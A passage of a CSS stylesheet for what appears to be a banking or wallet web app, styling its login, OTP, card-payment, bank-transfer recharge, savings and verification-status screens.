      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      max-height: 80vh;
      overflow-y: auto;
    }

    .savings-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
      padding-bottom: 0.5rem;
      border-bottom: 1px solid var(--neutral-300);
    }

    .savings-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .savings-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .savings-close:hover {
      background: var(--neutral-300);
    }

    .summary-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 1rem;
      margin-bottom: 1rem;
    }

    .summary-card {
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      padding: 1rem;
      box-shadow: var(--shadow-sm);
      text-align: center;
    }

    .summary-card.primary {
      background: var(--card-gradient);
      color: white;
    }

    .summary-amount {
      font-size: 1.25rem;
      font-weight: 700;
      margin-top: 0.5rem;
    }

    .quick-actions {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 1rem;
      margin-bottom: 1.5rem;
    }

    .savings-verify-banner {
      background: var(--warning);
      color: white;
      border-radius: var(--radius-md);
      padding: 0.6rem;
      text-align: center;
      margin-bottom: 1rem;
      font-size: 0.9rem;
    }

    .quick-action {
      background: var(--neutral-200);
      border-radius: var(--radius-lg);
      padding: 0.75rem;
      text-align: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .quick-action:hover {
      background: var(--neutral-300);
    }

    .quick-action i {
      display: block;
      font-size: 1.2rem;
      margin-bottom: 0.25rem;
    }

    .savings-list {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      margin-bottom: 1.5rem;
    }

    .savings-pot {
      background: linear-gradient(135deg, var(--neutral-100), var(--neutral-200));
      border: 1px solid var(--neutral-300);
      border-radius: var(--radius-lg);
      padding: 1rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: var(--shadow-sm);
    }

    .savings-pot strong {
      font-size: 0.9rem;
    }

    .pot-progress {
      height: 6px;
      background: var(--neutral-300);
      border-radius: var(--radius-full);
      margin: 0.25rem 0;
      overflow: hidden;
    }

    .pot-progress-bar {
      height: 100%;
      background: var(--success);
    }

    .savings-actions button {
      margin-left: 0.5rem;
      border-radius: var(--radius-md);
    }

    .savings-modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }

    .savings-modal-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .savings-modal-close:hover {
      background: var(--neutral-300);
    }

    /* Donation Overlay */
    .donation-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .donation-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
    }

    .donation-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }

    .donation-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .donation-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .donation-close:hover {
      background: var(--neutral-300);
    }

    .donation-form {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }
    
    /* Login Page */
    .login-container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      background: var(--neutral-200);
      background-image: linear-gradient(135deg, rgba(26, 31, 113, 0.05) 0%, rgba(26, 31, 113, 0.02) 100%);
    }
    
    .login-card {
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      box-shadow: var(--shadow-lg);
      padding: 1.5rem;
      width: 100%;
      max-width: 400px;
      animation: fadeIn 0.5s ease;
    }
    
    .login-logo {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin-bottom: 1.5rem;
    }
    
    .login-logo-container {
      width: 60px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 1rem;
    }
    
    .login-logo img {
      height: 45px;
      width: auto;
      object-fit: contain;
    }
    
    .login-heading {
      text-align: center;
      margin-bottom: 1.5rem;
    }
    
    .login-title {
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 0.5rem;
    }
    
    .login-subtitle {
      font-size: 0.85rem;
      color: var(--neutral-600);
    }

    .login-email {
      font-size: 0.8rem;
      color: var(--neutral-700);
      margin-top: 0.25rem;
    }

    .balance-owner {
      font-size: 0.75rem;
      color: var(--neutral-600);
      margin-bottom: 0.25rem;
    }

    .support-container {
      position: fixed;
      bottom: 1rem;
      left: 0;
      right: 0;
      display: flex;
      justify-content: center;
      margin-top: 0;
      z-index: 1000;
    }

    .support-menu {
      display: none;
      position: absolute;
      bottom: 110%;
      left: 50%;
      transform: translateX(-50%);
      background: var(--neutral-100);
      border: 1px solid var(--neutral-300);
      border-radius: var(--radius-md);
      box-shadow: var(--shadow-md);
      width: 220px;
      z-index: 1001;
      padding: 1rem;
    }

    .support-menu-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 0.75rem;
    }

    .support-menu-title {
      font-size: 1rem;
      font-weight: 600;
      color: var(--neutral-900);
    }

    .support-menu.open {
      display: block;
    }

    .support-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 0.5rem;
    }

    .support-option,
    .access-option {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0.5rem;
      padding: 0.5rem;
      font-size: 0.8rem;
      color: var(--neutral-900);
      cursor: pointer;
      text-align: center;
    }

    .support-icon {
      width: 50px;
      height: 50px;
      border-radius: var(--radius-full);
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      flex-shrink: 0;
    }

    .support-option:hover,
    .access-option:hover {
      background: var(--neutral-200);
    }

    .access-submenu {
      display: none;
      border-top: 1px solid var(--neutral-300);
    }

    .access-submenu.open {
      display: block;
    }
    
    .form-group {
      margin-bottom: 1.25rem;
      position: relative;
    }
    
    .form-label {
      display: block;
      font-size: 0.8rem;
      font-weight: 500;
      color: var(--neutral-700);
      margin-bottom: 0.5rem;
    }
    
    .form-control {
      width: 100%;
      height: 44px;
      padding: 0 1rem;
      border: 1px solid var(--neutral-400);
      border-radius: var(--radius-md);
      font-size: 0.85rem;
      color: var(--neutral-900);
      background: var(--neutral-100);
      transition: var(--transition-base);
    }
    
    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.15);
    }
    
    .error-message {
      font-size: 0.7rem;
      color: var(--danger);
      margin-top: 0.5rem;
      display: none;
    }

    .password-toggle {
      position: absolute;
      top: 50%;
      right: 0.75rem;
      transform: translateY(-50%);
      cursor: pointer;
      color: var(--neutral-600);
      font-size: 0.9rem;
    }

    .login-balance-card {
      background: var(--neutral-100);
      border: 1px solid var(--neutral-300);
      border-radius: var(--radius-lg);
      padding: 1rem;
      text-align: center;
      margin-bottom: 1.25rem;
      box-shadow: var(--shadow-sm);
    }

    .login-balance-main {
      font-size: 1.4rem;
      font-weight: 700;
      margin-bottom: 0.25rem;
      color: var(--primary);
    }

    .login-balance-eq {
      font-size: 0.8rem;
      color: var(--neutral-600);
      margin-bottom: 0.25rem;
    }

    .login-balance-rate {
      font-size: 0.75rem;
      color: var(--neutral-600);
    }

    .account-info {
      display: grid;
      grid-template-columns: auto 1fr;
      column-gap: 0.5rem;
      row-gap: 0.25rem;
    }

    .account-info div {
      font-size: 0.8rem;
      display: flex;
      align-items: center;
    }

    .account-info i {
      margin-right: 0.35rem;
      color: var(--primary);
    }

    #account-logo {
      margin-top: 0.5rem;
    }

    #account-logo img {
      height: 40px;
    }

    .account-limits {
      margin-top: 0.75rem;
      font-size: 0.8rem;
    }

    .limit-info {
      color: var(--neutral-700);
      margin-bottom: 0.5rem;
    }

    #withdrawal-limit-slider,
    #deposit-limit-slider {
      width: 100%;
    }

    .limit-value {
      font-weight: 600;
    }

    .account-balance {
      display: flex;
      justify-content: space-between;
      margin-top: 0.75rem;
      font-size: 0.85rem;
    }

    .account-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 0.75rem;
    }

    .account-actions {
      display: flex;
      gap: 0.5rem;
    }

    .btn-icon {
      background: transparent;
      color: var(--neutral-100);
      width: 32px;
      height: 32px;
      border: 1px solid rgba(255, 255, 255, 0.25);
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .btn-icon:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: rgba(255, 255, 255, 0.4);
    }
    
    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 44px;
      padding: 0 1.5rem;
      border-radius: var(--radius-md);
      font-weight: 600;
      font-size: 0.85rem;
      border: none;
      cursor: pointer;
      transition: all 0.3s var(--animation-bounce);
    }

    .btn-small {
      height: 32px;
      padding: 0 1rem;
      font-size: 0.75rem;
    }
    
    .btn-primary {
      background: var(--primary);
      color: white;
      width: 100%;
    }
    
    .btn-primary:hover {
      background: var(--primary-light);
      transform: translateY(-3px);
      box-shadow: var(--shadow-md);
    }
    
    .btn-primary:active {
      transform: translateY(0);
    }
    
    .btn-outline {
      background: transparent;
      border: 1px solid var(--primary);
      color: var(--primary);
    }
    
    .btn-outline:hover {
      background: rgba(26, 31, 113, 0.05);
      transform: translateY(-3px);
    }
    
    .btn i {
      margin-right: 0.5rem;
      font-size: 0.9rem;
    }
    
    /* OTP Verification for Card Payment */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1100;
      display: none;
      animation: fadeIn 0.3s ease;
    }
    
    .modal {
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      width: 90%;
      max-width: 380px;
      padding: 1.5rem;
      animation: scaleIn 0.3s ease;
    }
    
    .modal-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 0.75rem;
      text-align: center;
    }
    
    .modal-subtitle {
      font-size: 0.85rem;
      color: var(--neutral-600);
      margin-bottom: 1.5rem;
      text-align: center;
    }
    
    .otp-container {
      display: flex;
      gap: 0.5rem;
      margin: 1.5rem 0;
      justify-content: center;
    }
    
    .otp-input {
      width: 40px;
      height: 48px;
      border: 1px solid var(--neutral-400);
      border-radius: var(--radius-md);
      text-align: center;
      font-size: 1.25rem;
      font-weight: 600;
      color: var(--neutral-900);
    }
    
    .otp-input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.15);
    }
    
    .resend-code {
      text-align: center;
      margin-top: 1rem;
      font-size: 0.8rem;
      color: var(--neutral-600);
    }
    
    .resend-code a {
      color: var(--primary);
      text-decoration: none;
      font-weight: 500;
    }
    
    /* Feature Blocked Modal */
    .feature-blocked-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1100;
      display: none;
    }

    .feature-blocked-card {
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      width: 90%;
      max-width: 380px;
      padding: 1.5rem;
      animation: scaleIn 0.3s ease;
      text-align: center;
    }

    .feature-blocked-icon {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: var(--warning);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.75rem;
      margin: 0 auto 1.25rem;
    }

    .feature-blocked-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 0.75rem;
    }

    .feature-blocked-message {
      font-size: 0.85rem;
      color: var(--neutral-600);
      margin-bottom: 1.5rem;
      line-height: 1.6;
    }

    .feature-blocked-actions {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }
    
    /* Recharge Page */
    .recharge-container {
      padding: 1rem;
      padding-top: 70px;
      padding-bottom: 70px;
      display: none;
      max-width: 800px;
      margin: 0 auto;
    }
    
    .payment-method-tabs {
      display: flex;
      margin-bottom: 1.5rem;
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      padding: 0.25rem;
    }
    
    .payment-method-tab {
      flex: 1;
      text-align: center;
      padding: 0.6rem 0.5rem;
      border-radius: var(--radius-md);
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition-base);
      white-space: nowrap;
    }
    
    .payment-method-tab.active {
      background: var(--neutral-100);
      box-shadow: var(--shadow-sm);
      color: var(--primary);
    }
    
    .payment-method-content {
      display: none;
    }
    
    .payment-method-content.active {
      display: block;
      animation: fadeIn 0.5s ease;
    }
    
    .amount-select {
      width: 100%;
      height: 44px;
      padding: 0 1rem;
      border: 1px solid var(--neutral-400);
      border-radius: var(--radius-md);
      font-size: 0.85rem;
      color: var(--neutral-900);
      background: var(--neutral-100);
      margin-bottom: 1.5rem;
    }
    
    .amount-select:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.15);
    }
    
    .security-badge {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      background: rgba(26, 31, 113, 0.05);
      border-radius: var(--radius-md);
      padding: 0.75rem;
      margin-bottom: 1.25rem;
    }
    
    .security-badge-icon {
      width: 30px;
      height: 30px;
      background: var(--primary);
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 0.9rem;
      flex-shrink: 0;
    }
    
    .security-badge-content {
      flex: 1;
      min-width: 0;
    }
    
    .security-badge-title {
      font-weight: 600;
      font-size: 0.8rem;
      color: var(--neutral-900);
      margin-bottom: 0.125rem;
    }
    
    .security-badge-text {
      font-size: 0.7rem;
      color: var(--neutral-600);
      white-space: normal;
    }
    
    /* Bank Account Details */
    .bank-details {
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      padding: 1.1rem;
      margin: 1.25rem 0;
    }
    
    .bank-detail-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 0.75rem;
      padding-bottom: 0.75rem;
      border-bottom: 1px solid var(--neutral-300);
    }
    
    .bank-detail-row:last-child {
      margin-bottom: 0;
      padding-bottom: 0;
      border-bottom: none;
    }
    
    .bank-detail-label {
      font-size: 0.8rem;
      color: var(--neutral-600);
      flex-shrink: 0;
      margin-right: 0.5rem;
    }
    
    .bank-detail-value {
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--neutral-900);
      display: flex;
      align-items: center;
      gap: 0.5rem;
      text-align: right;
      word-break: break-word;
      flex-grow: 1;
    }
    
    .copy-btn {
      background: var(--neutral-300);
      color: var(--neutral-700);
      width: 26px;
      height: 26px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: var(--radius-full);
      cursor: pointer;
      transition: var(--transition-base);
      flex-shrink: 0;
    }
    
    .copy-btn:hover {
      background: var(--primary);
      color: white;
    }
    
    .bank-warning {
      background: rgba(247, 182, 0, 0.1);
      border-left: 3px solid var(--warning);
      padding: 0.75rem;
      margin-top: 1.25rem;
      border-radius: var(--radius-sm);
    }
    
    .bank-warning-title {
      font-weight: 600;
      font-size: 0.85rem;
      color: var(--neutral-900);
      margin-bottom: 0.5rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .bank-warning-title i {
      color: var(--warning);
    }
    
    .bank-warning-content {
      font-size: 0.8rem;
      color: var(--neutral-700);
    }
    .bank-note {
      background: rgba(0, 149, 255, 0.1);
      border-left: 3px solid var(--info);
      padding: 0.75rem;
      margin-top: 1rem;
      border-radius: var(--radius-sm);
      font-size: 0.8rem;
      color: var(--neutral-700);
    }

    
    /* Receipt Upload */
    .receipt-upload {
      border: 2px dashed var(--neutral-400);
      border-radius: var(--radius-md);
      padding: 1.5rem 1rem;
      margin: 1.25rem 0;
      text-align: center;
      cursor: pointer;
      transition: var(--transition-base);
    }
    
    .receipt-upload:hover {
      border-color: var(--primary);
      background: rgba(26, 31, 113, 0.02);
    }
    
    .receipt-upload i {
      font-size: 2rem;
      color: var(--neutral-500);
      margin-bottom: 0.75rem;
    }
    
    .receipt-upload-title {
      font-weight: 600;
      font-size: 0.9rem;
      color: var(--neutral-800);
      margin-bottom: 0.4rem;
    }
    
    .receipt-upload-subtitle {
      font-size: 0.75rem;
      color: var(--neutral-600);
    }
    
    .receipt-preview {
      display: none;
      margin-top: 1.25rem;
    }
    
    .receipt-preview-container {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      padding: 0.8rem;
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      margin-bottom: 0.75rem;
    }
    
    .receipt-preview-icon {
      width: 40px;
      height: 40px;
      border-radius: var(--radius-md);
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.1rem;
      flex-shrink: 0;
    }
    
    .receipt-preview-content {
      flex: 1;
      min-width: 0;
    }
    
    .receipt-preview-name {
      font-weight: 600;
      font-size: 0.8rem;
      margin-bottom: 0.2rem;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    
    .receipt-preview-size {
      font-size: 0.7rem;
      color: var(--neutral-600);
    }
    
    .receipt-preview-actions {
      display: flex;
      gap: 0.5rem;
    }
    
    /* Reference Number */
    .reference-number {
      margin-top: 1.25rem;
    }
    
    /* Credit Card Form */
    .card-preview {
      width: 100%;
      max-width: 350px;
      height: 200px;
      margin: 0 auto 1.5rem;
      perspective: 1000px;
      transition: var(--transition-base);
    }
    
    .card-inner {
      position: relative;
      width: 100%;
      height: 100%;
      transition: transform 0.8s;
      transform-style: preserve-3d;
    }
    
    .card-preview.-active .card-inner {
      transform: rotateY(180deg);
    }
    
    .card-front,
    .card-back {
      position: absolute;
      width: 100%;
      height: 100%;
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden;
      border-radius: var(--radius-lg);
      padding: 1.25rem;
      box-shadow: var(--shadow-lg);
    }
    
    .card-front {
      background: var(--card-gradient);
      color: white;
    }
    
    .card-back {
      background: var(--card-gradient);
      color: white;
      transform: rotateY(180deg);
    }
    
    .card-logo {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      margin-bottom: 2rem;
    }
    
    .card-chip {
      width: 40px;
      height: auto;
      flex-shrink: 0;
    }
    
    .card-brand {
      width: 55px;
      height: auto;
      flex-shrink: 0;
    }
    
    .card-number {
      font-size: 1.25rem;
      letter-spacing: 1px;
      margin-bottom: 1.25rem;
      font-family: monospace;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    
    .card-details {
      display: flex;
      justify-content: space-between;
      font-size: 0.8rem;
    }
    
    .card-holder {
      text-transform: uppercase;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      max-width: 65%;
    }
    
    .card-expiry {
      display: flex;
      gap: 0.25rem;
      flex-shrink: 0;
    }
    
    .card-stripe {
      height: 40px;
      background: #000;
      margin: 1rem 0;
    }
    
    .card-cvv {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      height: 40px;
      background: white;
      color: black;
      border-radius: 4px;
      padding: 0 0.75rem;
      font-size: 1rem;
      font-family: monospace;
    }
    
    .card-form {
      display: flex;
      flex-direction: column;
      gap: 1.25rem;
    }
    
    .card-row {
      display: flex;
      gap: 0.75rem;
    }
    
    .card-col {
      flex: 1;
    }

    .saved-card-container {
      display: none;
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      padding: 1rem;
      margin-bottom: 1.5rem;
    }

    .saved-card {
      display: flex;
      align-items: center;
      gap: 1rem;
    }

    .saved-card-icon {
      width: 40px;
      height: 40px;
      border-radius: var(--radius-full);
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.25rem;
    }

    .saved-card-details {
      flex: 1;
    }

    .saved-card-number {
      font-weight: 600;
      font-size: 0.9rem;
      color: var(--neutral-900);
    }

    .saved-card-type {
      font-size: 0.75rem;
      color: var(--neutral-600);
    }

    .saved-card-use {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .saved-card-checkbox {
      width: 18px;
      height: 18px;
    }
    
    /* Loading */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(5px);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 1100;
      display: none;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
      margin-bottom: 1.5rem;
    }
    
    .loading-text {
      color: white;
      font-size: 1rem;
      margin-bottom: 1.5rem;
      font-weight: 500;
    }
    
    .progress-bar-container {
      width: 80%;
      max-width: 280px;
      height: 8px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: var(--radius-full);
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      background: white;
      width: 0%;
      border-radius: var(--radius-full);
      transition: width 0.3s ease;
    }
    
    /* Success Animation */
    .success-container {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1200;
      display: none;
    }
    
    .success-card {
      background: white;
      border-radius: var(--radius-lg);
      width: 90%;
      max-width: 380px;
      padding: 2rem;
      text-align: center;
      animation: scaleIn 0.3s ease;
    }
    
    .success-checkmark {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: var(--success);
      color: white;
      font-size: 2.25rem;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.5rem;
      transform: scale(0);
      animation: checkmarkScale 0.5s ease forwards 0.3s;
    }
    
    .success-title {
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 0.75rem;
      opacity: 0;
      animation: fadeInUp 0.5s ease forwards 0.8s;
    }
    
    .success-amount {
      font-size: 2.25rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 1.25rem;
      opacity: 0;
      animation: fadeInUp 0.5s ease forwards 1.1s;
    }
    
    .success-message {
      font-size: 0.9rem;
      color: var(--neutral-600);
      margin-bottom: 1.5rem;
      opacity: 0;
      animation: fadeInUp 0.5s ease forwards 1.4s;
    }
    
    .success-actions {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      opacity: 0;
      animation: fadeInUp 0.5s ease forwards 1.7s;
    }
    
    /* Verification Banner */
    .verify-banner {
      background: var(--neutral-100);
      border: 2px solid var(--warning-orange);
      border-radius: var(--radius-md);
      padding: 0.9rem 1rem;
      display: flex;
      align-items: center;
      gap: 1rem;
      margin: 1.25rem 0;
      box-shadow: var(--shadow-md);
      color: var(--warning-orange);
    }
    
    .verify-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--warning-orange);
      color: #fff;
      font-size: 1.1rem;
      flex-shrink: 0;
    }
    
    .verify-content {
      flex: 1;
      min-width: 0;
    }
    
    .verify-title {
      font-weight: 700;
      margin-bottom: 0.25rem;
      font-size: 0.9rem;
    }
    
    .verify-text {
      font-size: 0.8rem;
      opacity: 0.9;
    }
    
    .verify-action {
      background: var(--warning-orange);
      color: #fff;
      font-weight: 600;
      font-size: 0.8rem;
      padding: 0.4rem 0.75rem;
      border-radius: var(--radius-md);
      flex-shrink: 0;
      transition: all 0.3s var(--animation-bounce);
      cursor: pointer;
      border: none;
      white-space: nowrap;
    }
    
    .verify-action:hover {
      transform: translateY(-3px);
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    /* Verification Processing Banner - NUEVA IMPLEMENTACIN */
    .verification-processing-banner {
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      padding: 1rem;
      display: none;
      align-items: center;
      flex-wrap: wrap;
      gap: 1rem;
      margin-bottom: 1.25rem;
      box-shadow: var(--shadow-sm);
      color: var(--neutral-900);
      position: relative;
    }

    .verification-processing-banner:hover {
      box-shadow: var(--shadow-md);
      transform: translateY(-3px);
    }
    
    .verification-processing-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--visa-blue);
      color: #fff;
      font-size: 1.1rem;
      flex-shrink: 0;
    }
    
    .verification-processing-content {
      flex: 1;
      min-width: 0;
    }
    
    .verification-processing-title {
      font-weight: 700;
      margin-bottom: 0.25rem;
      font-size: 0.9rem;
    }
    
    .verification-processing-text {
      font-size: 0.8rem;
      opacity: 0.9;
    }

    .verification-note {
      font-size: 0.75rem;
      color: var(--neutral-700);
      margin-top: 0.25rem;
    }

    .verification-progress-container {
      width: 100%;
      height: 6px;
      background: rgba(0, 0, 0, 0.1);
      border-radius: var(--radius-full);
      overflow: hidden;
      margin-top: 0.5rem;
    }

    .verification-progress-bar {
      height: 100%;
      background: var(--visa-blue);
      width: 0%;
      transition: width 0.3s ease;
    }
    .verification-processing-spinner {
      width: 20px;
      height: 20px;
      border: 2px solid rgba(0, 0, 0, 0.2);
      border-radius: 50%;
      border-top-color: var(--visa-blue);
      animation: spin 1s linear infinite;
      flex-shrink: 0;
    }

    .verification-support-btn {
      background: rgba(255, 255, 255, 0.2);
      color: white;
      font-weight: 500;
      font-size: 0.7rem;
      padding: 0.3rem 0.6rem;
      border-radius: var(--radius-md);
      flex-shrink: 0;
      transition: all 0.3s ease;
      cursor: pointer;
      border: none;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 0.3rem;
      backdrop-filter: blur(5px);
    }
    
    .verification-support-btn:hover {
      background: rgba(255, 255, 255, 0.3);
      transform: translateY(-2px);
    }

    .verification-support-btn i {
      font-size: 0.8rem;
    }
    
/* Verification Status Cards */

.verification-status-cards {
  margin-top: 1rem;
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  justify-content: space-between;
  gap: 1rem;
  width: 100%;
}

.verification-status-item,
.verificacion-item {
  display: flex;
  flex-direction: row;
  align-items: center;
  justify-content: space-between;
  flex: 1;
  min-width: 30%;
  gap: 0.75rem;
  background: var(--neutral-100);
  padding: 0.75rem 1rem;
  border-radius: var(--radius-md);
  color: var(--neutral-900);
  box-shadow: var(--shadow-sm);
  transition: all 0.3s ease;
  margin-bottom: 0;
}

.verification-status-item:hover {
  background: var(--neutral-200);
  box-shadow: var(--shadow-md);
}

.status-icon-container {
  width: 32px;
  height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.status-icon {
  font-size: 1.5rem;
}

.status-icon.success {
  color: #4ade80;
  filter: drop-shadow(0 0 4px rgba(74, 222, 128, 0.5));
  animation: checkmarkPulse 2s ease-in-out infinite;
}

.status-icon.warning {
  color: #fbbf24;
  filter: drop-shadow(0 0 4px rgba(251, 191, 36, 0.5));
  animation: warningPulse 1.5s ease-in-out infinite;
}

.status-spinner {
  width: 24px;
  height: 24px;
  border: 3px solid rgba(0, 0, 0, 0.1);
  border-radius: 50%;
  border-top-color: var(--visa-blue);
  animation: spin 1s linear infinite;
}

.status-text {
  flex: 1;
}

.status-label {
  font-weight: 600;
  font-size: 0.75rem;
  margin-bottom: 0.05rem;
}

.status-sublabel {
  font-size: 0.65rem;
  opacity: 0.9;
}

.validation-actions {
  margin-top: 0.4rem;
  display: flex;
  gap: 0.5rem;
}

/* Verification Section */
.verificacion-section {
  background: var(--neutral-100);
  border-radius: var(--radius-lg);
  padding: 1rem;
  box-shadow: var(--shadow-sm);
  margin-bottom: 1.25rem;
  font-family: inherit;
}

.verificacion-titulo {
  display: flex;
  align-items: center;
  gap: 0.4rem;
  font-size: 1rem;
  font-weight: 600;
  color: #1f2937;
  margin-bottom: 0.25rem;
  font-family: inherit;
}

.verificacion-descripcion {
  font-size: 0.875rem;
  color: var(--neutral-600);
  margin-bottom: 0.75rem;
  font-family: inherit;
}

.icono-titulo {
  width: 20px;
  height: 20px;
}


.verificacion-grid {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.verificacion-card {
  width: 100%;
  display: flex;
  align-items: flex-start;
  gap: 0.75rem;
  background: var(--neutral-100);
  border-radius: var(--radius-md);
  padding: 0.75rem 1rem;
  box-shadow: var(--shadow-sm);
}

.verificacion-card .icono-estatus {
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.verificacion-card .contenido-estatus {
  flex: 1;
}

.verificacion-card .contenido-estatus strong {
  font-size: 0.75rem;
  font-weight: 600;
  color: #1f2937;
  font-family: inherit;
}

.verificacion-card .contenido-estatus p {
  font-size: 0.65rem;
  color: var(--neutral-600);
  margin: 0;
  font-family: inherit;
}

.verificacion-card.estatus-exitoso .icono-estatus svg {
  stroke: var(--success-green);
}

.verificacion-card.estatus-pendiente .icono-estatus svg {
  stroke: var(--warning-orange);
}

/* Pending validation card styled like transactions */
